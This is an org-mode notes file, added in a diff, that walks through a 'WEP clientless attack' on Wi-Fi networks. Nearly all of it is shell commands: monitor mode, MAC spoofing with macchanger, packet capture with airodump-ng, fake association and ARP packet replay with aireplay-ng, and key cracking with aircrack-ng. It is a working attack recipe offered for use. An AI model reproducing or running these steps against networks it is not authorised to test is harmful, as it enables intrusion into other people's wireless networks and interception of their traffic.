@@ -1,0 +1,65 @@
+#+STARTUP: content
+* wep clientless attack
+
+#+begin_src hs
+modprobe rtc-cmos
+#+end_src
+
+* 1 - put card into monitor mode
+
+#+begin_src sh
+sudo airmon-ng stop ath0
+sudo ifconfig wifi0 down
+#+end_src
+
+* 2 - Create fake mac address
+
+#+begin_src sh
+sudo macchanger --mac 00:11:22:33:44:55 wifi0
+sudo airmon-ng start wifi0
+#+end_src
+
+* 3 - run airodump-ng
+
+#+begin_src sh
+sudo airodump-ng ath0
+#+end_src
+
+find the network to attack
+copy the bssid, channel number and network name
+
+#+begin_src sh
+sudo airodump-ng -c (channel number) -w (name for dump packets) --bssid (network bssid) ath0
+#+end_src
+
+* 5 - Associate with the access point
+
+#+begin_src sh
+sudo aireplay-ng -1 0 -a (network bssid) -h 00:11:22:33:44:55 (faked mac address) ath0
+#+end_src
+
+or with essid name
+
+#+begin_src sh
+sudo aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0
+#+end_src
+
+* 6 - start aireplay-ng 
+
+#+begin_src sh
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b (bssid) -h 00:11:22:33:44:55 ath0
+#+end_src
+
+press y
+
+* 7 - run aircrack-ng with the name of your capture file
+
+#+begin_src sh
+sudo aircrack-ng wep-01.cap 
+#+end_src
+
+#+begin_src sh
+aircrack-ng -n 64 --bssid (network bssid) (name for dump packets)
+#+end_src
+
+
